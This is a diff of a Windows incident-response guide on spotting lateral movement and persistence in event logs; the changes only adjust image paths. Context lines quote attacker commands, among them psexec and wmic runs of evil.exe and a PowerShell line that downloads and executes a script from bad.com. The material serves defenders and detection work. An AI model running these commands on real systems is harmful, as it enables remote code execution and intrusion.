@@ -374,7 +374,7 @@ Alerts that should be hunted for are deleted tasks. It is common for attackers t
 
 **Notes**: When an event log has been cleared, the first event in the log chronologically will be an ID 1102 System Event, indicating that the log was cleared. This assumes that the system has the correct auditing policy to audit successful system events. Looking at ID 1102 Event Properties, you should see that the Security event log was cleared, and it should display the date and time when it occurred. Within the description section, the account name will be displayed, indicating the user account that cleared the log along with a logon ID for the session.&#x20;
 
-<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 133845 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 133845 (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lateral Movement Adversary Tactics
 
@@ -385,7 +385,7 @@ If admins use remote desktop, expect attacker usage
 * Most commonly, Microsoft Remote Desktop (RDP)
 * Also, look for VNC, TeamViewer, etc. (if available in the network)&#x20;
 
-<figure><img src="../../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** When tracking lateral movement, one thing to remember is that eventually, attackers will start to move around in the same manner as administrators. Once attackers achieve admin and domain admin credentials, they will quickly move around the network, so you will likely see adversaries taking advantage. RDP is the most common remote desktop protocol in Windows networks. The best logs are located on the destination (or target) machine.
 
@@ -402,7 +402,7 @@ Different artifacts on Source and Destination
 * Notice the wealth of registry and file system info on Source
 * The destination has more robust event log artefacts&#x20;
 
-<figure><img src="../../.gitbook/assets/image 3.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 3.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** When investigating lateral movement, you must understand where our evidence will be recorded. The destination, or target, system will log activity largely via **Windows Event Logs**. While you may identify registry, filesystem, and memory artifacts related to helper file execution (such as **rdpclip.exe,** which facilitates clipboard sharing between sessions), we will be mainly relying on the logging provided by Windows and, therefore, a good reason for centralise because once a malicious pattern is identified, it can be quickly searched across all endpoints if the logs are all in one place.
 
@@ -421,7 +421,7 @@ Mounting built-in shares is a simple and effective means of lateral movement:
 net use z: \\host\c$ /user: domain\username <password
 ```
 
-<figure><img src="../../.gitbook/assets/image 4.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 4.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** Windows administrative shares are default shared resources designed to allow administrative programs access to the entire file system. They are present on every modern version of Windows (though hidden) and are almost always enabled. From a lateral movement perspective, the most interesting of these shares are the drive volume shares (e.g., C$), the Admin$ share giving access to the Windows folder, and the IPC$ share commonly used by named pipes.
 
@@ -435,7 +435,7 @@ An important artifact on the source system is the Windows registry key **NTUSER\
 * Pass-the-hash attacks are common
 * Windows requires domain admin or built-in admin rights&#x20;
 
-<figure><img src="../../.gitbook/assets/image 5 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 5 (1).png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** Attackers can access Admin shares to upload tools into nearly any folder. Drive volume shares give complete access to the entire volume, making them a quick way to remotely pillage sensitive files. Since SMB has significant flaws that allow NTLM relay attacks and few environments have adequately hardened SMB with new upgrades like SMB signing, pass-the-hash attacks are commonly used with this attack vector. Luckily, modern versions of Windows (Vista and above) now require domain admin privileges or the built-in admin account (RID 500) for remote access to admin shares. Shares are also a common vector for malware to move laterally—Conficker, Shamoon, Wannacry, NotPetya, and North Korean malware in the Sony Pictures attack all searched for or created new shares to propagate.
 
@@ -453,7 +453,7 @@ If you have network monitoring available, SMB is a well-known protocol that is n
 psexec.exe \\host -accepteula -d -c c:\temp\evil.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image 6.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 6.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** PsExec is a lightweight tool for remote administration. It can push and execute code non-interactively, make built-in system commands “remote-capable” by sending data back to the originating system, and even be used for interactive console sessions (i.e., running a cmd.exe shell on the remote system). A sample command might look like the following.
 
@@ -477,7 +477,7 @@ Another place to discover PsExec activity is via running processes and memory an
 * Copies of PsExeSvc.exe and any other binaries to the Windows folder
 * Executes code via a service (PSEXESVC)&#x20;
 
-<figure><img src="../../.gitbook/assets/image 7.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 7.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** PsExec requires multiple steps to remotely execute commands. First, it must authenticate to the destination system. Named pipes are then set up between the source and destination. The ADMIN$ share is mounted on the destination, and PsExeSvc.exe and any other binaries are copied to the Windows folder (by default). Finally, a Windows service is started, and the files copied are executed. With all this activity occurring in the background, PsExec can result in significant event log activity on the destination system. Authentication occurs under the current user context by default, resulting in an **ID 4624 Type 3** (Network) logon event. If the attacker changes the account context (with the -u option), the authentication event is an **ID 4624 Type 2** (Console) logon for that new account.
 
@@ -529,7 +529,7 @@ These commands can also leave behind process artifacts in memory and application
 
 #### Windows Remote Management Tools: Remote Services
 
-<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 084908.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 084908.png" alt=""><figcaption></figcaption></figure>
 
 Investigator Notes: Remote services, unfortunately, leave behind a few artefacts on the source system. While **sc.exe** can be identified via application execution artifacts, without command line auditing, it can be difficult to determine if it was used on a local service or a destination system.
 
@@ -537,7 +537,7 @@ On the destination system, we have many artifacts to identify malicious activiti
 
 #### Windows Remote Management Tools: Scheduled Tasks
 
-<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 085357.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 085357.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** Scheduled task activity leaves enormous residue on the source and destination systems. Source systems have the standard application execution and “runas” explicit credential artifacts. However, the destination system contains a wealth of information defenders are interested in.
 
@@ -550,7 +550,7 @@ Like most lateral movement techniques, event logs on the destination system can 
 * PowerShell will be covered separately
 * Source system artifacts are sparse
 
-<figure><img src="../../.gitbook/assets/image 8.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 8.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** WMI is a flexible remote (and local) management infrastructure. While PowerShell can leverage and script WMI commands, WMI can also be used as an attack tool. The use of WMI and PowerShell is increasing as attackers seek to evade security mechanisms and leave smaller forensic footprints. Attackers sometimes have an advantage when using these tools as, in some cases, there are few forensic artifacts left behind to show their activity.
 
@@ -572,7 +572,7 @@ wmic /node:host /user:user process call create "c:\temp\evil.exe" Invoke-WmiMeth
     * The new Microsoft-Windows-WMIActivity/Operational log is a game changer
     * Look for residue left from WMI event consumers
 
-    <figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 090915.png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 090915.png" alt=""><figcaption></figcaption></figure>
 
     **Investigator Notes:** WMI activity can be a blind spot in most enterprises. On the destination system, event logs will be useful for authentication events, particularly if you can tie them to a process-tracking event or application execution of wmiprvse.exe (the core process used for remote WMI actions). **Microsoft-Windows-WMIActivity/Operational**, provides evidence of remote WMI activity and is one of the few artifacts that can help identify WMI event consumers (commonly used for malware persistence). This log is one of our best (and only) information sources for WMI attacks.
 
@@ -583,7 +583,7 @@ The destination file system can help us identify any executables copied to the r
 * Look for evidence of Powershell.exe execution.
 * PowerShell v5 (Win10+) introduced improved logging
 
-<figure><img src="../../.gitbook/assets/image 9.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 9.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** PowerShell is a scripting language that has access to WMI (and much more). PowerShell remoting uses the **WinRM** protocol to scale tasks. Using PowerShell, running a credential dumper on one system is nearly as simple as running it remotely on 1,000 systems. PowerShell remoting must be enabled to scale effectively, which is increasingly the case as it is used heavily for enterprise administration. The most common PowerShell commands for lateral movement are **Invoke-Command** and **Enter-PSSession**. The latter provides an encrypted interactive shell to the remote system, similar to SSH.
 
@@ -612,7 +612,7 @@ If you are in an environment where Windows remote management is not used, you ar
 
     * Blocklisted cmdlets are logged by default
 
-    <figure><img src="../../.gitbook/assets/image 10.png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../../../.gitbook/assets/image 10.png" alt=""><figcaption></figcaption></figure>
 
     **Investigator Notes:** When investigating a target (destination) system involved in potential PowerShell attacks, look for evidence of **wsmprovhost.exe** execution. This process is executed on the receiving end of a PowerShell remoting session and may be rare in some environments (in others, it may be ubiquitous). Additionally, PowerShell may be used to push and execute arbitrary binaries on the system, so strange file creation and application execution events can lead to evidence proving PowerShell activity.
 
@@ -650,7 +650,7 @@ Registry run keys are recorded with security Event ID: **Event ID               
 
 Event names refer to an Object except **event ID 4657**, which refers to the registry. **Event IDs 4656, 4658, 4660,** and **4663** are designed to record any access to an object, including the registry keys, while **event ID 4657** is designed to audit changes in the registry keys.
 
-<figure><img src="../../.gitbook/assets/image 11.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 11.png" alt=""><figcaption></figcaption></figure>
 
 Event consists of four sections. The first is the **Subject** section, which refers to information about the user who performed the action. The second is the **Object** section, which consists of the **Object Server** field and is always **Security**. The Object Type field refers to the type of the accessed object, which could be a file, key, or SAM;  focus on the **Key** value, which refers to registry keys, to investigate the registry run key persistence technique. The last interesting field is the **Object Name**, which refers to the name of the accessed object, including the registry key path. The third section is the **Process Information** section, which refers to the process that made the action, and the last section is **Access Request Information**, which refers to the permissions. Still, it’s not helpful to our investigations.
 
@@ -666,9 +666,9 @@ schtasks /create /tn mysc /tr C:\Users\Public\test.exe /sc ONLOGON /ru System
 
 Event ID 4698 logs scheduled task activity creation in Security event log files
 
-<figure><img src="../../.gitbook/assets/image 12.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 12.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image 13 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 13 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Windows Services
 
@@ -680,13 +680,13 @@ sc.exe create TestService binpath= c:\windows\temp\NewServ.exe start=auto
 
 Microsoft tracks new service creation activities **via Event ID 7045** in the system event logs and **Event ID 4697** in the Security event logs.&#x20;
 
-<figure><img src="../../.gitbook/assets/image 14 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 14 (1).png" alt=""><figcaption></figcaption></figure>
 
 The above shows **event ID 4697**, which records new service creation activity and is recorded in the Security event logs. The event log is divided into two sections: the first section is the **Subject** section, which contains information about the user who created the service, and the second is the **Service** Information section, which contains information about the newly created service.
 
 Focus on the **Service Information** section’s fields; the first field refers to the newly created service name. The second field is **Service File Name**, which refers to the binary path that the service executes; the third field indicates the created service type, and the fourth field is **Service Start Type**, which indicates when and how the service will start. The start type values are numeric (0 = a boot device such as Windows drivers, 1 = a driver started by the I/O subsystem, 2 = an auto-start service (the service start type used by attackers to keep persistence), 3 = a manual start, and 4 = a disabled service). The last field is **Service Account**, which refers to the account the service runs under its context.
 
-<figure><img src="../../.gitbook/assets/image 15.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 15.png" alt=""><figcaption></figcaption></figure>
 
 The above shows **event ID 7045**, which records new service creation activity in the system event log file. All the details in this log field are the same as those in the **Service Information** section of e**vent ID 4697**. The above shows **event ID 7045**, which records new service creation activity in the system event log file. All the details in this log field are the same as those in the **Service Information** section of e**vent ID 4697**.
 
@@ -730,7 +730,7 @@ Application log event ID 1001 records Windows Error Reporting events and can ide
 
 #### Evidence of Malware Execution – Pass-the-Hash Toolkit
 
-<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 115034.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 115034.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** Remember that the operating system and applications running on the system might have security mechanisms that only log to the System or Application logs.
 
@@ -796,7 +796,7 @@ To audit for WMI event filter/consumer activity, review the WMI-Activity/Operati
 
 #### Auditing WMI Persistence (2)
 
-<figure><img src="../../.gitbook/assets/image 16.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image 16.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** 5861 events indicating a new WMI event consumer creation. This type of event can be rare in many enterprises (some environments have routine consumers created by software, but they are usually very identifiable and easy to allowlist). Its rarity makes it an excellent artifact to audit. Since the event also records the full consumer information, you should pay attention to any unusual executables, PowerShell, or VBScript references, as these are the most common vectors abused by attackers and advanced malware. Here, an encoded PowerShell script has been set as the consumer. We would want to investigate this, and it would be trivial to extract the base64 encoded PowerShell script from this output for analysis. Further, we could cross-reference this event with a corresponding EID 5859 event to identify this consumer's chosen filter (trigger).
 
@@ -812,7 +812,7 @@ To audit for WMI event filter/consumer activity, review the WMI-Activity/Operati
   * EID 5858 includes hostname and username – search for known bad
 * Search for uncommon keywords to identify anomalies:
 
-<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 123900.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 123900.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes:** The WMI-Activity/Operational log includes good logging for WMI events. Event ID (EID) 5861 is a great first choice since the event consumer is often the easiest to identify as evil. Here you will look for CommandLine and ActiveScript consumers running suspicious executables, PowerShell commands, or scripts. Note that you will see legitimate consumers in almost every enterprise. However, these should be relatively standard and easy to allow. Some common legitimate consumer names are: SCM Event Log, BVTFilter, TSlogonEvent.vbs, TSLogonFilter, RAevent.vbs, RmAssistEventFilter, KernCap.vbs, NTEventLogConsumer, and WSCEAA.exe (Dell). Be careful here! Attackers have been seen in the wild using names similar to these legitimate ones (such as SCM Event Consumer) to blend in.
 
@@ -846,7 +846,7 @@ Most logging is not enabled by default, so the data might not be available when 
 
 #### PowerShell Syntax to Achieve Stealth
 
-<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 130620.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 130620.png" alt=""><figcaption></figcaption></figure>
 
 **Investigator Notes**: Like many attacker behaviours, a limited set of syntax is frequently used to make malicious PowerShell activity more difficult to discover. While **(New-Object System.Net.Webclient).DownloadFile()** is the most common within many attack frameworks; it is not the only way to download files using PowerShell. Also, look for commonly abused commands like **Start-BitsTransfer** and **Invoke-WebRequest.**
 
@@ -859,7 +859,7 @@ Most logging is not enabled by default, so the data might not be available when 
   * IEX (New-Object Net.Webclient).downloadstring("http://bad.com/bad.ps1")
 * Filter using commonly abused keywords
 
-<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 131346.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 131346.png" alt=""><figcaption></figcaption></figure>
 
 * Look for obvious signs of encoding and obfuscation
 
@@ -882,7 +882,7 @@ Windows will label suspicious events as EID 4104 “Warning” events. This can 
     * Integration with Antimalware Scanning Interface (AMSI)
     * Character frequency analysis (Revoke-Obfuscation project)
 
-    <figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 132551.png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 132551.png" alt=""><figcaption></figcaption></figure>
 
     **Investigator Notes:** As antivirus, enterprise detection and response tools, and logging have improved detecting suspicious PowerShell, attackers have developed ingenious ways to defeat simple keyword detection. PowerShell is incredibly flexible, allowing a seemingly endless array of different ways to write the same script.
 
@@ -907,7 +907,7 @@ The commands are stored locally in each user’s profile using a file named **Co
 
 While similar to Transcript logging, only commands typed (not outputs) are recorded, and no additional metadata like timestamps are available. These logs are only recorded during interactive sessions explicitly using the PowerShell console. Their one advantage over transcript logging is that they are available by default for all users.
 
-<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 133845 1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Screenshot 2023-10-01 133845 1.png" alt=""><figcaption></figcaption></figure>
 
 #### Event Log Collection
 
